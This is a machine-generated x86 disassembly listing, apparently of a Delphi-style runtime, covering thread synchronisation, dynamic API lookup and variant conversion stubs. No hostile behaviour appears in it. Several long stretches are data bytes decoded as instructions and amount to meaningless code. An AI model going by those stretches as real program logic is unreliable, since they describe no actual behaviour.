mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b430
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2db
lea eax [ ebp - 0x14 ]
call sub_404120
retn
sub_40d32c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408b9c
mov [ rw-data ] eax
sub_40d3b0
push ebx
push esi
push edi
push ebp
call sub_40375c
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4027d4
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403380
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403744
sub_40d418
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d400
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d4a0
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_408084
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d3a0
mov [ ebp ] eax
sub_40d4a0
push ebx
mov ebx eax
mov eax ebx
call sub_40d400
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40d3a0
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d4e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_40d554
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_40d5e0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403390
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_40d5e0
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d59c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d418
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40d3a8
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40d388
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40d3a8
test eax eax
je r-xdata
mov eax edi
call sub_40d59c
test bl bl
je r-xdata
mov eax edi
call sub_40d5d0
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40d388
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40d394
sub_40d67c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d418
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40d3a8
mov eax ebx
call sub_40d5b4
mov eax ebx
call sub_40d5a8
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d490
sub_40d6cc
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d418
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d5c0
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40d394
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40d388
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d5c0
mov eax esi
call sub_40d5b4
sub_40d738
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d418
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d490
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40d388
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d5b4
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d5b4
sub_40d7b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d7d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d84b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405b50
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403444
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d852
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403444
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d7b0
test al al
jne r-xdata
mov al 0x1
sub_40d86c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d8de
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d8c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4045e0
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8c7
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d8f0
sbb eax 0x4000000
jecxz r-xdata
inc edi
add [ ebx * 2 - 0x1d4bffb8 ] bh
add al bl
pop ebp
dec eax
add ah bh
loop r-xdata
inc edi
add [ edx + ebx * 2 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ edx ] dl
inc edi
add [ esi + ebx * 2 ] bl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] dl
loop r-xdata
inc edi
add [ esp + ebx * 2 ] dl
add [ esp + ebx * 2 + 0x48 ] dh
add ah dh
loop r-xdata
inc edi
add [ eax + 0x485d ] bl
add [ eax ] al
add al bh
loope r-xdata
inc edi
add ah dl
pop ecx
dec eax
add [ eax ] al
add [ eax ] al
add [ edx ] cl
inc edi
add al ah
pop edx
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] cl
loop r-xdata
dec eax
add [ edx + 0x5f280047 ] ah
inc edi
add [ eax ] ah
pop esp
add [ eax ] bl
pop edx
dec eax
add ah ch
loop r-xdata
inc edi
add [ ebx + ebx * 2 + 0x48 ] al
add [ eax ] al
fsubr st1
inc edi
add al bl
pop edx
dec eax
add [ eax ] al
add [ eax ] al
add ah dh
loope r-xdata
inc edi
add al dl
pop ecx
dec eax
add [ eax ] al
add [ eax ] al
add al bl
loope r-xdata
add [ eax + 0x5d ] bl
dec eax
add [ eax ] al
add [ eax ] al
add al dh
loope r-xdata
inc edi
add ah dl
pop edx
dec eax
add [ eax ] al
add [ eax ] al
add [ edx ] al
inc edi
add [ eax + 0x5a ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
dec eax
add [ edx + 0x5c180047 ] bl
inc edi
add [ eax ] ch
pop edi
add [ eax + 0x5e ] al
dec eax
add ah ah
loop r-xdata
inc edi
add [ ebp + ebx * 2 + 0x48 ] dl
add al ch
pop esp
dec eax
add [ eax ] al
add [ eax ] al
add al al
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x180047e1 ] ch
inc edi
add [ esi + ebx * 2 + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add ah dl
loope r-xdata
inc edi
add [ esi + ebx * 2 + 0x48 ] cl
add [ eax ] al
in al dx
loope r-xdata
inc edi
add [ eax + 0x5e ] dh
dec eax
add [ eax ] al
add [ eax ] al
add al ch
loope r-xdata
inc edi
add [ eax ] ch
pop esp
dec eax
add [ eax ] al
add [ eax ] al
add ah bh
loope r-xdata
dec eax
add [ edx + 0x5fd80047 ] dl
inc edi
add [ eax ] bl
pop esp
add [ eax - 0x23ffb7a2 ] dl
loop r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd3c
retn
mov eax rw-data
call sub_40d7a0
call sub_40d30c
call sub_40c3cc
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40bea4 ]
call sub_404bd4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
call sub_404120
mov eax rw-data
mov edx [ r-xdata ]
call sub_4054a4
mov eax rw-data
mov edx [ r-xdata ]
call sub_4054a4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_40482c
mov eax rw-data
call sub_404120
pop ebx
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x59e00047 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb81f ] ah
pop esi
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x60140047 ] bl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x580047e1 ] bl
pop edx
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x59b40047 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x180047e1 ] dl
pop edi
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x5d500047 ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x5bffb81f ] cl
pop edi
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x47 ] ah
add [ esp + ebx * 2 ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1f ] ah
inc edi
add [ eax ] ch
pop ebx
dec eax
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40dd35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
inc edi
add [ eax ] bl
add al dl
pop ebx
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x59cc0047 ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x640047e1 ] bh
pop esp
dec eax
inc edi
add ah cl
pop ecx
add [ eax ] cl
pop ebp
dec eax
add [ eax ] al
add [ eax ] al
add al dl
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x5f500047 ] dh
inc edi
add [ esp + ebx * 2 + 0x48 ] ah
add [ eax + 0x5b ] dh
dec eax
add [ eax ] al
add [ eax ] al
add ah cl
loope r-xdata
inc edi
add al al
pop ebp
dec eax
add [ eax ] al
add [ eax ] al
add ah ah
loope r-xdata
inc edi
add [ eax ] dl
pop esp
dec eax
add [ eax ] al
add [ eax ] al
add al ah
loope r-xdata
dec eax
add [ edx + 0x5d9c0047 ] cl
dec eax
add [ edx + 0x5d700047 ] al
inc edi
add al bl
pop edi
add [ ebx + ebx * 2 ] bh
dec eax
add ah dl
loop r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffb81f ] dh
inc edi
add [ eax + 0x5f ] dl
add al cl
pop esp
dec eax
add [ eax ] al
add [ eax ] al
add al cl
loope r-xdata
pop esi
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x5d540047 ] ch
dec eax
inc edi
add al ah
add [ ebp + ebx * 2 + 0x48 ] bh
add [ eax ] al
add [ eax ] al
add ah al
loope r-xdata
dec eax
add [ edx + 0x47 ] bh
inc edi
add [ ebp + ebx * 2 - 0x1d7bffb8 ] bl
add [ eax + 0x5c ] bl
dec eax
add ah cl
loop r-xdata
inc edi
add [ eax + 0x5d ] dh
add [ eax - 0x3bffb7a7 ] bh
loop r-xdata
add ah ch
pop edi
dec eax
add [ edx + 0x47 ] dh
add [ edi + ebx * 2 + 0x48 ] dh
add [ edx + 0x47 ] ch
add [ eax ] dh
pop esp
dec eax
add [ edx + 0x47 ] ah
add [ eax ] dh
pop edi
dec eax
add [ edx + 0x47 ] bl
add [ eax + 0x5f ] cl
dec eax
add [ edx + 0x47 ] dl
add [ ebx + ebx * 2 ] bl
dec eax
add [ edx + 0x47 ] cl
add [ edx + ebx * 2 - 0x1dbbffb8 ] ch
inc edi
add [ ebp + ebx * 2 + 0x48 ] ah
add [ edx ] bh
inc edi
add [ esi + ebx * 2 ] dh
dec eax
add [ edx ] dh
inc edi
add al cl
pop ecx
dec eax
add [ edx ] ch
inc edi
add [ edi + ebx * 2 ] ah
dec eax
add [ edx ] ah
inc edi
add [ esp + ebx * 2 ] ch
dec eax
add [ eax ] ch
add [ eax ] al
add [ edx ] bl
inc edi
add [ edi + ebx * 2 ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] bl
loop r-xdata
inc edi
dec eax
add [ edx + 0x5c200047 ] ch
add ah cl
pop esp
dec eax
add [ edx + 0x5d3c0047 ] bh
dec eax
add [ edx + 0x5c140047 ] dh
sub_40dd40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40dda8
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ddaf
retn
mov eax sub_40d8f0
call sub_403ecc
mov eax r-xdata
call sub_403ef4
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c348
call sub_40c44c
call sub_40d32c
call sub_40cd90
mov eax rw-data
mov edx r-xdata
call sub_404174
sub_40dde8
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40de3c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40de96
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408750
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de9d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40dea8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40df02
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409ae8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df09
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40df14
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40df6e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409abc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df75
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40df80
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dfda
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b3a4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfe1
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40dfec
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40e046
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409b14
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e04d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40e058
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40e0c5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4043a8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_40885c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0cc
lea eax [ ebp - 0x8 ]
call sub_404120
retn
sub_40e0d8
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e138
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409a34
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404978
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e13f
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40e148
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e1a8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40ab30
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404978
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1af
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40e1b8
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e21c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4088f8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404978
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e223
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40e26c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40e298
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40dde8
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de18
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de18
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de24
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de24
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de24
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de24
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de24
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de24
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de24
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de24
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de24
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de30
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de3c
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dea8
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df14
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df80
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dfec
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e058
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e0d8
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e148
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e1b8
mov eax r-xdata
call sub_40e26c
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e5a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e5c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5d0
retn
sub_40e71e
inc [ eax ]
add [ eax ] al
add [ eax ] cl
push esi
popad
jb r-xdata
out 0x40 eax
add [ edx ] bh
out 0x40 eax
add [ edi - 0x19 ] al
inc eax
add [ edi + 0x40 ] dl
popad
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx + 0x5c ] dl
mov dh 0x1c

int3
sub_40e784
popad
out 0x40 eax
add [ esi - 0x19 ] ch
inc eax
add [ eax - 0x19 ] bh
inc eax
add [ 0x3a0040e7 ] ch
out 0x40 eax
add [ edi - 0x19 ] al
inc eax
add [ edi + 0x40 ] dl
add [ ecx ] al
add [ eax ] al
add [ edx + 0x5c ] dl
mov dh 0x1c

sub_40e7a9
mov ebx 0x589e41a6
jg r-xdata
add al 0x8b
add bh bh
and [ ebx - 0xbfbdbbc ] al
jmp sub_4160bc
push ss
mov esi 0xe7842deb
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xe8
inc eax
add [ eax + 0x40e7 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 8 + 0x40 ] bl
add [ eax ] dl
add [ eax ] al
add [ esi ] dh
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x2bffbea1 ] al
pushad
inc ecx
add [ eax ] dl
pushad
inc ecx
add [ eax + 0x41 ] al
add [ eax ] ah
inc ecx
add [ eax ] dh
inc ecx
add [ eax ] cl
inc ecx
add [ ebx + ebx * 2 + 0x5bec0041 ] dh
inc ecx
add [ eax + 0x5c ] bh
inc ecx
add [ eax - 0x6fffbfd5 ] dl
sub eax [ eax ]
test al 0x5b
inc ecx
add [ eax + 0x60 ] bl
inc ecx
add [ eax + 0x5c ] al
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ ecx ] bl
inc ecx
add ah dh
inc cx
add [ eax ] al
inc ecx
add ah bl
inc cx
add al ch
inc cx
add [ esi ] dl
push esp
dec ecx
outsb
jbe r-xdata
jo r-xdata
imul esp [ ebp + 0x61 ] 0x62
insb
push esi
sub [ ebx ] dh
jb r-xdata
outsd
popad
outsb
je r-xdata
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e9 ] cl
add [ eax ] al
add [ esp + edi * 2 + 0x40 ] bl
popad
jb r-xdata
push esi
and al 0xe9
inc eax
add [ eax ] al
add [ eax ] al
jb r-xdata
